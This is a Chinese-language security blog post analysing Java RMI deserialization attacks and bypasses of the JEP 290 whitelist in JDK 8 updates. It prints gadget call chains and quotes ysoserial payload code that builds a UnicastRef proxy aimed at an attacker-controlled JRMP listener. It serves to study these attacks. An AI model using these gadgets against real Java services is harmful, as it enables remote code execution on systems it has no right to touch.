---
title: Java RMI 8u131 bypass
date: 2020-09-19 12:30:00 +0800
categories: [record]
tags: [all]
---

针对RMI机制层面的反序列化攻击

以jdk8u121来说 新增的白名单有:

- Number.class
- Remote.class
- Proxy.class
- UnicastRef.class
- RMIClientSocketFactory.class
- RMIServerSocketFactory.class
- ActivationID.class
- UID.class

## 8u232的绕过 新的反序列化漏洞

利用从上面的白名单 UnicastRef类被反序列化 会主动发起JRMP请求触发readObject()  要理解UnicastRef类的作用 先从RMI机制开始


RMI中的远程调用 都通过Stub完成 客户端通过lookup()拿到的就是stub

`LocateRegistry.getRegistry(host, port)`返回的是一种特殊stub `RegistryImpl_Stub对`象 先看下创建代码:

![picture 0](https://chenxvn53.github.io/image/1ad1521721e9f801ff25a26d23474aecca0a27fb839d398c0d237d319f7e8eea.png)  

以UnicastRdf封装RMI注册中心的信息 接着跟进Util.createProxy()

![picture 3](https://chenxvn53.github.io/image/a286a1993e258a088c16662a53ecc3161ec007190fc683c3779a8bd3c6b333ff.png)  

以UnicastRef对象创建`RemoteObjectInvocationHandler`实例 以此handler代理RegistryImpl 以便调用`bind`/`lookup`

要攻击攻击RMI注册中心 调用RegistryImpl_Stub.bind(serviceName, obj) 这个过程中UnicastRef的作用:

- 建立连接：利用内部的 IP/Port 开启一个 Socket 连接
- 传输数据：将序列化后的字节流发送给远端的 Registry 服务

触发UnicastRef外联JRMP请求的调用链:

```
RemoteObjectInvocationHandler.readObejct->
sun.rmi.server.UnicastRef#readExternal()
 ->sun.rmi.transport.LiveRef#read(ObjectInput var0)
  ->sun.rmi.transport.tcp.TCPEndpoint#readHostPortFormat(ObjectInput var0)
  ->sun.rmi.transport.DGCClient#registerRefs(Endpoint var0)
   ->DGCClient.EndpointEntry.lookup(Endpoint var0)
    ->sun.rmi.transport.DGCClient.EndpointEntry#registerRefs(List<LiveRef>)
     ->sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall
      ->sun.rmi.transport.DGCImpl_Stub#dirty
       ->sun.rmi.server.UnicastRef#invoke()
     
```

由反序列化作为入口 读取Endpoint对象 调用lookup() 触发JRMP请求 此时将server翻转为client攻击

RMI通信传递对象通过反序列化机制 server和client都会触发readObject() 

以上部分就是ysoserial中JRMPClient的原理 getObject源码如下:

```java
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint(host, port); //
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), 
        new Class[] {Registry.class}, obj);
return proxy;
```

一般配合ysoserial.exploit.JRMPListener: 反序列化了 UnicastRef，主动连接到JRMPListener的端口

JRMPListener 会利用 JRMP 协议返回一个精心构造的恶意gadget链的对象

### 8u232_b09的修复

![picture 0](https://chenxvn53.github.io/image/ff433032eac945cae0bdf4fc023a198bce42352ff7b3fed52ee2935c6c044123.png)  


### 8u132 绕过 UnicastRemoteObject Gadget

JEP 290 默认拦截了 UnicastRef 和 RemoteObjectInvocationHandler 的直接反序列化

UnicastRemoteObject 在反序列化时会自动执行导出Export操作 这个过程会启动一个监听端口

```java
//UnicastRemoteObject的反序列化过程
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject(); // 恢复成员变量 port
    reexport();             // 重新导出对象
}

private void reexport() throws RemoteException {
    if (obj > 0) {
        // 如果使用了旧版逻辑
        exportObject(this, port); 
    } else {
        // 现代逻辑
        exportObject(this, port, csf, ssf); 
    }
}
```

`ysoserial.payloads.JRMPListener` 构造UnicastRemoteObject对象 目的是让目标启动JRMP监听端口:

```java
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
```

配合`ysoserial.exploit.JRMPClient` 攻击目标的JRMP端口 触发反序列化

整个过程利用RMI处理分布式GC的机制 在连接JRMP端口时在流内写入特定ID 触发DGC服务进入`DGCImpl_Skel.dispatch`逻辑

```
UnicastRemoteObject#readObject -->
    UnicastRemoteObject#reexport -->
        UnicastRemoteObject#exportObject --> overload
            UnicastRemoteObject#exportObject -->
                UnicastServerRef#exportObject --> ...
                        TCPTransport#listen -->
                            TcpEndpoint#newServerSocket -->
                                RMIServerSocketFactory#createServerSocket --> Dynamic Proxy(RemoteObjectInvocationHandler)
                                    RemoteObjectInvocationHandler#invoke -->
                                        RemoteObjectInvocationHandler#invokeMethod -->
                                            UnicastRef#invoke --> (Remote var1, Method var2, Object[] var3,long var4)
                                                StreamRemoteCall#executeCall --> 
                                                    ObjectInputSteam#readObject --> "pwn"
```